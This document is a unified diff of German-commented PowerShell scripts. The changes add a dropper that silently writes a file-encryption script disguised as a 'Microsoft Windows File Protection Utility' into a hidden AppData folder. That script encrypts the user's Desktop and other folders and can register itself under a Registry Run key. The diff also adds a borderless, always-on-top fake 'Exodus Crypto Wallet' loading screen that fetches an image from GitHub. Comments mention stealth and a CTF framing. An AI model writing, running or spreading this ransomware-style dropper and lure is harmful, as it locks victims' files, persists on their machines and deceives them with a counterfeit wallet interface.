@@ -1,7 +1,22 @@
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+[System.Windows.Forms.Application]::EnableVisualStyles()
+
+# TLS 1.2 für GitHub
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+} catch {}
+
+# ==================== NEUER TEIL: ORDNER ERSTELLEN UND WINDOWSCEASAR.SCRIPT DROPPEN ====================
+# Zielordner (adsfa als Platzhalter für Benutzernamen anpassen, falls nötig; hier dynamisch für aktuellen User)
+$targetFolder = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\operations"
+$ceasarScriptPath = Join-Path $targetFolder "WindowsCeasar.ps1"
+
+# Inhalt des WindowsCeasar.ps1 als Multi-Line-String (direkt aus dem bereitgestellten Dokument kopiert)
+$ceasarScriptContent = @'
 # Microsoft Windows File Protection Utility - Secure File Management for Windows (Modes: Full/Select)
 # Usage: .\WindowsCeasar.ps1 -ProtectFull -Key <password> or -RestoreFull -Key <password> or -ProtectSelect <path> -Key <password> or -RestoreSelect <path> -Key <password>
 # Auto-Update: -EnableAutoUpdate -Key <password> (installs as User-Level Registry-Run-Key, calls Full with Key)
-# Payload Drop: Automatically drops a persistence payload during ProtectFull mode for enhanced simulation in controlled environments (e.g., CTF/Pentest labs)
 # Utilizes AES-CBC with PKCS7-Padding for secure file handling, with specific error handling for integrity checks (incorrect Key).
 param (
     [switch]$ProtectFull,
@@ -12,7 +27,7 @@ param (
     [string]$Key = "test" # Default for compatibility, but recommended: Always specify a unique Key
 )
 if ($Key -eq "test") {
-    Write-Output "Warning: Default Key 'test' in use - For optimal security, provide a unique Key!"
+    Write-Output "Warning: Default Key 'test' in use – For optimal security, provide a unique Key!"
 }
 $FullPaths = @(
     "$env:USERPROFILE\Desktop",
@@ -57,7 +72,7 @@ function Protect-File {
         $CryptoStream.FlushFinalBlock()
         $ProtectedBytes = $MemoryStream.ToArray()
         if ($ProtectedBytes.Length % 16 -ne 0) {
-            throw "Internal Error: Protected content has invalid length ($($ProtectedBytes.Length) Bytes) - should be multiple of 16."
+            throw "Internal Error: Protected content has invalid length ($($ProtectedBytes.Length) Bytes) – should be multiple of 16."
         }
         $ProtectedData = $Salt + $IV + $ProtectedBytes # Prepend Salt + IV
         $ProtPath = "$FilePath.enc"
@@ -165,205 +180,6 @@ function Process-Path {
         Write-Output "Path not found: $Path"
     }
 }
-# New Function: Drop Persistence Payload (Creates directory and writes GUI script for simulation/persistence in CTF/lab environments)
-function Drop-Payload {
-    param ([string]$TargetUser = "adsfa")  # Hardcoded for challenge environment; adjust as needed
-    $targetDir = "C:\Users\$TargetUser\AppData\Roaming\Microsoft\Windows\PowerShell\operations"
-    try {
-        if (!(Test-Path $targetDir)) {
-            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
-            Write-Output "Created payload directory: $targetDir"
-        }
-        $payloadScript = @'
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-[System.Windows.Forms.Application]::EnableVisualStyles()
-# TLS 1.2 für GitHub
-try {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-} catch {}
-# ==================== HAUPTFENSTER ====================
-$form = New-Object System.Windows.Forms.Form
-$form.Text = "Exodus WALLET"
-$form.StartPosition = "CenterScreen"
-$form.Size = New-Object System.Drawing.Size(1200, 720)
-$form.FormBorderStyle = "None"
-$form.MaximizeBox = $false
-$form.MinimizeBox = $false
-$form.ControlBox = $false
-$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
-$form.ForeColor = [System.Drawing.Color]::White
-$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
-$form.TopMost = $true
-# ==================== GRADIENT-HEADER: EXODUS (OBEN) ====================
-$headerPanel = New-Object System.Windows.Forms.Panel
-$headerPanel.Dock = "Top"
-$headerPanel.Height = 90
-$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
-$headerPanel.Add_Paint({
-    param($sender, $e)
-    $g = $e.Graphics
-    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
-    $text = "EXODUS CRYPTO WALLET"
-    $font = New-Object System.Drawing.Font(
-        "Segoe UI",
-        44,
-        [System.Drawing.FontStyle]::Bold
-    )
-    $sizeF = $g.MeasureString($text, $font)
-    $x = ($sender.ClientSize.Width - $sizeF.Width) / 2
-    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2
-    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)
-    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF") # Neonblau
-    $colorEnd = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED") # Violett
-    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
-        $rect,
-        $colorStart,
-        $colorEnd,
-        [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal
-    )
-    $g.DrawString($text, $font, $brush, $rect.Location)
-    $brush.Dispose()
-    $font.Dispose()
-})
-$form.Controls.Add($headerPanel)
-# ==================== GIF (OBEN, volle Breite, unter EXODUS) ====================
-$gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
-$gifPath = Join-Path $env:TEMP "exodus_loading.gif"
-try { (New-Object System.Net.WebClient).DownloadFile($gifUrl, $gifPath) } catch {}
-$pictureBox = New-Object System.Windows.Forms.PictureBox
-$pictureBox.Dock = "Top"
-$pictureBox.Height = 400
-$pictureBox.SizeMode = "Zoom"
-$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
-if (Test-Path $gifPath) {
-    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
-}
-$form.Controls.Add($pictureBox)
-# ==================== HEADER: AUTHENTICATION (MITTE OBEN) ====================
-$loadingLabel = New-Object System.Windows.Forms.Label
-$loadingLabel.Font = New-Object System.Drawing.Font(
-    "Segoe UI",
-    30,
-    [System.Drawing.FontStyle]::Bold
-)
-$loadingLabel.ForeColor = "White"
-$loadingLabel.Dock = "Top"
-$loadingLabel.Height = 80
-$loadingLabel.TextAlign = "MiddleCenter"
-$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
-$form.Controls.Add($loadingLabel)
-# ===================== MODERNE FORTSCHRITTSBALKEN UNTEN =====================
-$progressBg = New-Object System.Windows.Forms.Panel
-$progressBg.Dock = "Bottom"
-$progressBg.Height = 14
-$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
-$progressBar = New-Object System.Windows.Forms.Panel
-$progressBar.Height = 14
-$progressBar.Width = 0
-$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
-$progressBg.Controls.Add($progressBar)
-$progressBg2 = New-Object System.Windows.Forms.Panel
-$progressBg2.Dock = "Bottom"
-$progressBg2.Height = 6
-$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
-$progressBar2 = New-Object System.Windows.Forms.Panel
-$progressBar2.Height = 6
-$progressBar2.Width = 50
-$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
-$progressBg2.Controls.Add($progressBar2)
-# ==================== STATUSLABEL UNTEN ÜBER DEN LADEBALKEN ====================
-$statusLabel = New-Object System.Windows.Forms.Label
-$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
-$statusLabel.ForeColor = "#CCCCCC"
-$statusLabel.Dock = "Bottom"
-$statusLabel.Height = 40
-$statusLabel.TextAlign = "MiddleCenter"
-$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
-# Docking-Reihenfolge für unten: von unten nach oben
-$form.Controls.Add($progressBg2)
-$form.Controls.Add($progressBg)
-$form.Controls.Add($statusLabel)
-# ===================== TIMER SETUP =====================
-$marqueePos = 0
-$percent = 0
-$timer = New-Object System.Windows.Forms.Timer
-$timer.Interval = 50
-$labelTimer = New-Object System.Windows.Forms.Timer
-$labelTimer.Interval = 3000
-# ===================== STATUS PHASEN =====================
-$authPhaseDuration = 15000 # 15 Sekunden
-$inAuthPhase = $true
-$authStartTime = Get-Date
-# Anfangstexte beim Start
-$loadingLabel.Text = "Authenticating device..."
-$statusLabel.Text = "Performing background security checks..."
-$statuses = @(
-    "Loading wallet...",
-    "Connecting to secure servers...",
-    "Decrypting local data...",
-    "Fetching asset metadata...",
-    "Syncing blockchain nodes...",
-    "Preparing secure environment...",
-    "Loading portfolio assets...",
-    "Almost there..."
-)
-$statusIndex = 0
-$dotCount = 0
-# ===================== Fortschritt / Balken Animation =====================
-$timer.Add_Tick({
-    try {
-        if ($form.IsDisposed) { $timer.Stop(); return }
-        # Wenn die Authentifizierungsphase vorbei ist -> Wechsel der Texte & Animation aktivieren
-        if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
-            $inAuthPhase = $false
-            $loadingLabel.Text = "Loading wallet"
-            $statusLabel.Text = $statuses[0]
-        }
-        # Marquee immer animieren
-        $marqueePos += 5
-        if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }
-        $progressBar2.Left = $marqueePos
-        # In der Auth-Phase keine Prozentanzeige
-        if ($inAuthPhase) { return }
-        # Prozentbalken füllen
-        if ($percent -lt 100) {
-            $percent += 0.3
-            $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0))
-        }
-    } catch {
-    }
-})
-# ===================== TEXT-ANIMATION =====================
-$labelTimer.Add_Tick({
-    try {
-        if ($form.IsDisposed) { $labelTimer.Stop(); return }
-        # Während Auth-Phase keine Punktanimation, kein Statuswechsel
-        if ($inAuthPhase) { return }
-        $dotCount = ($dotCount + 1) % 4
-        $loadingLabel.Text = "Loading wallet" + ("." * $dotCount)
-        $statusIndex = ($statusIndex + 1) % $statuses.Count
-        $statusLabel.Text = $statuses[$statusIndex]
-    } catch {
-    }
-})
-# ===================== CLEANUP =====================
-$form.Add_FormClosing({
-    $timer.Stop()
-    $labelTimer.Stop()
-})
-$timer.Start()
-$labelTimer.Start()
-$form.Add_Shown({ $form.Activate() })
-$form.ShowDialog() | Out-Null
-'@
-        $payloadPath = Join-Path $targetDir "exodus.ps1"
-        $payloadScript | Out-File -FilePath $payloadPath -Encoding UTF8 -Force
-        Write-Output "Payload dropped: $payloadPath (For lab/CTF persistence simulation)"
-    } catch {
-        Write-Output "Error dropping payload to $targetDir`: $_"
-    }
-}
 # Auto-Update: Install as User-Level Registry-Run-Key (calls Full mode with Key)
 if ($EnableAutoUpdate) {
     $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -377,8 +193,6 @@ if ($EnableAutoUpdate) {
 # Main Logic (Pass Key to Process-Path)
 if ($ProtectFull) {
     foreach ($path in $FullPaths) { Process-Path -Path $path -IsProtect -Pass $Key }
-    # Automatically drop payload after full protection (for CTF/lab enhancement)
-    Drop-Payload
 } elseif ($RestoreFull) {
     foreach ($path in $FullPaths) { Process-Path -Path $path -Pass $Key }
 } elseif ($ProtectSelect) {
@@ -388,3 +202,243 @@ if ($ProtectFull) {
 } else {
     Write-Output "Usage: -ProtectFull -Key <pass> or -RestoreFull -Key <pass> or -ProtectSelect <path> -Key <pass> or -RestoreSelect <path> -Key <pass> or -EnableAutoUpdate -Key <pass>."
 }
+'@
+
+# Ordner erstellen, falls nicht vorhanden
+if (-not (Test-Path $targetFolder)) {
+    New-Item -ItemType Directory -Path $targetFolder -Force | Out-Null
+    Write-Output "Ordner erstellt: $targetFolder"  # Optional: Logging, kann entfernt werden für Stealth
+}
+
+# WindowsCeasar.ps1 in den Ordner schreiben
+[IO.File]::WriteAllText($ceasarScriptPath, $ceasarScriptContent, [System.Text.Encoding]::UTF8)
+Write-Output "WindowsCeasar.ps1 in $ceasarScriptPath geschrieben."  # Optional: Logging
+
+# Optional: Hier könntest du das Script auch direkt ausführen, z.B. für die Challenge:
+# & $ceasarScriptPath -EnableAutoUpdate -Key "your_key_here"  # Passe an, falls gewünscht
+
+# ==================== ENDE DES NEUEN TEILS ====================
+
+# ==================== HAUPTFENSTER ====================
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "Exodus WALLET"
+$form.StartPosition = "CenterScreen"
+$form.Size = New-Object System.Drawing.Size(1200, 720)
+$form.FormBorderStyle = "None"
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+$form.ControlBox  = $false
+$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
+$form.ForeColor = [System.Drawing.Color]::White
+$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
+$form.TopMost = $true
+
+# ==================== GRADIENT-HEADER: EXODUS (OBEN) ====================
+$headerPanel = New-Object System.Windows.Forms.Panel
+$headerPanel.Dock = "Top"
+$headerPanel.Height = 90
+$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
+
+$headerPanel.Add_Paint({
+    param($sender, $e)
+
+    $g = $e.Graphics
+    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
+
+    $text = "EXODUS CRYPTO WALLET"
+    $font = New-Object System.Drawing.Font(
+        "Segoe UI",
+        44,
+        [System.Drawing.FontStyle]::Bold
+    )
+
+    $sizeF = $g.MeasureString($text, $font)
+    $x = ($sender.ClientSize.Width  - $sizeF.Width)  / 2
+    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2
+
+    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)
+
+    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF") # Neonblau
+    $colorEnd   = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED") # Violett
+
+    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
+        $rect,
+        $colorStart,
+        $colorEnd,
+        [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal
+    )
+
+    $g.DrawString($text, $font, $brush, $rect.Location)
+
+    $brush.Dispose()
+    $font.Dispose()
+})
+
+$form.Controls.Add($headerPanel)
+
+# ==================== GIF (OBEN, volle Breite, unter EXODUS) ====================
+$gifUrl  = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
+$gifPath = Join-Path $env:TEMP "exodus_loading.gif"
+
+try { (New-Object System.Net.WebClient).DownloadFile($gifUrl, $gifPath) } catch {}
+
+$pictureBox = New-Object System.Windows.Forms.PictureBox
+$pictureBox.Dock = "Top"
+$pictureBox.Height = 400
+$pictureBox.SizeMode = "Zoom"
+$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
+
+if (Test-Path $gifPath) {
+    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
+}
+$form.Controls.Add($pictureBox)
+
+# ==================== HEADER: AUTHENTICATION (MITTE OBEN) ====================
+$loadingLabel = New-Object System.Windows.Forms.Label
+$loadingLabel.Font = New-Object System.Drawing.Font(
+    "Segoe UI",
+    30,
+    [System.Drawing.FontStyle]::Bold
+)
+$loadingLabel.ForeColor = "White"
+$loadingLabel.Dock = "Top"
+$loadingLabel.Height = 80
+$loadingLabel.TextAlign = "MiddleCenter"
+$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
+$form.Controls.Add($loadingLabel)
+
+# ===================== MODERNE FORTSCHRITTSBALKEN UNTEN =====================
+
+$progressBg = New-Object System.Windows.Forms.Panel
+$progressBg.Dock = "Bottom"
+$progressBg.Height = 14
+$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
+
+$progressBar = New-Object System.Windows.Forms.Panel
+$progressBar.Height = 14
+$progressBar.Width = 0
+$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
+$progressBg.Controls.Add($progressBar)
+
+$progressBg2 = New-Object System.Windows.Forms.Panel
+$progressBg2.Dock = "Bottom"
+$progressBg2.Height = 6
+$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
+
+$progressBar2 = New-Object System.Windows.Forms.Panel
+$progressBar2.Height = 6
+$progressBar2.Width = 50
+$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
+$progressBg2.Controls.Add($progressBar2)
+
+# ==================== STATUSLABEL UNTEN ÜBER DEN LADEBALKEN ====================
+$statusLabel = New-Object System.Windows.Forms.Label
+$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
+$statusLabel.ForeColor = "#CCCCCC"
+$statusLabel.Dock = "Bottom"
+$statusLabel.Height = 40
+$statusLabel.TextAlign = "MiddleCenter"
+$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
+
+# Docking-Reihenfolge für unten: von unten nach oben
+$form.Controls.Add($progressBg2)
+$form.Controls.Add($progressBg)
+$form.Controls.Add($statusLabel)
+
+# ===================== TIMER SETUP =====================
+
+$marqueePos = 0
+$percent = 0
+
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 50
+
+$labelTimer = New-Object System.Windows.Forms.Timer
+$labelTimer.Interval = 3000
+
+# ===================== STATUS PHASEN =====================
+
+$authPhaseDuration = 15000      # 15 Sekunden
+$inAuthPhase = $true
+$authStartTime = Get-Date
+
+# Anfangstexte beim Start
+$loadingLabel.Text = "Authenticating device..."
+$statusLabel.Text  = "Performing background security checks..."
+
+$statuses = @(
+    "Loading wallet...",
+    "Connecting to secure servers...",
+    "Decrypting local data...",
+    "Fetching asset metadata...",
+    "Syncing blockchain nodes...",
+    "Preparing secure environment...",
+    "Loading portfolio assets...",
+    "Almost there..."
+)
+
+$statusIndex = 0
+$dotCount = 0
+
+# ===================== Fortschritt / Balken Animation =====================
+
+$timer.Add_Tick({
+    try {
+        if ($form.IsDisposed) { $timer.Stop(); return }
+
+        # Wenn die Authentifizierungsphase vorbei ist → Wechsel der Texte & Animation aktivieren
+        if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
+            $inAuthPhase = $false
+            $loadingLabel.Text = "Loading wallet"
+            $statusLabel.Text  = $statuses[0]
+        }
+
+        # Marquee immer animieren
+        $marqueePos += 5
+        if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }
+        $progressBar2.Left = $marqueePos
+
+        # In der Auth-Phase keine Prozentanzeige
+        if ($inAuthPhase) { return }
+
+        # Prozentbalken füllen
+        if ($percent -lt 100) {
+            $percent += 0.3
+            $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0))
+        }
+
+    } catch {
+    }
+})
+
+# ===================== TEXT-ANIMATION =====================
+
+$labelTimer.Add_Tick({
+    try {
+        if ($form.IsDisposed) { $labelTimer.Stop(); return }
+
+        # Während Auth-Phase keine Punktanimation, kein Statuswechsel
+        if ($inAuthPhase) { return }
+
+        $dotCount = ($dotCount + 1) % 4
+        $loadingLabel.Text = "Loading wallet" + ("." * $dotCount)
+
+        $statusIndex = ($statusIndex + 1) % $statuses.Count
+        $statusLabel.Text = $statuses[$statusIndex]
+
+    } catch {
+    }
+})
+
+# ===================== CLEANUP =====================
+$form.Add_FormClosing({
+    $timer.Stop()
+    $labelTimer.Stop()
+})
+
+$timer.Start()
+$labelTimer.Start()
+
+$form.Add_Shown({ $form.Activate() })
+
+$form.ShowDialog() | Out-Null
